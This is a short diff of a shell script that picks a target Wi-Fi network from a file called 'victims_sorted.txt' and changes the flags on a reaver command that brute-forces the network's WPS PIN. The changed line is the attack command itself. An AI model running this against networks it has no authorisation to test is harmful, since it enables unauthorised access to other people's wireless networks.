@@ -11,4 +11,4 @@ ESSID=`cat victims_sorted.txt|sed 1d|head -1|awk '{print $6}'`
 
 echo NETWORK SELECTED: $ESSID
 
-sudo reaver -i en1 -c $CHANNEL -b $BSSID -e $ESSID -a -v -S -L
+sudo reaver -i en1 -b $BSSID -d 10 -S -N -vv
